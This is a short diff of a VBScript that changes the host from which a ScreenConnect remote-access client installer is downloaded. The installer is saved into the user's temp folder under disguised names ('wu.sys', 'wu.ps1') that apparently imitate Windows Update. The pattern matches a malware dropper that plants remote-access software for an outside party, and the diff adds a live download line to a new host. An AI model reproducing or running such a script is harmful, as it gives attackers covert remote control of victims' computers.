@@ -13,7 +13,7 @@ If Not objFso.FolderExists(strPath) Then
     strPath = objWsh.ExpandEnvironmentStrings("%TEMP%") & "\"
 End If
 
-strUrl = "https://earthlink7.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
+strUrl = "https://mentacesi.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
 strSave = strPath & "wu.sys"
 strScript = strPath & "wu.ps1"
 
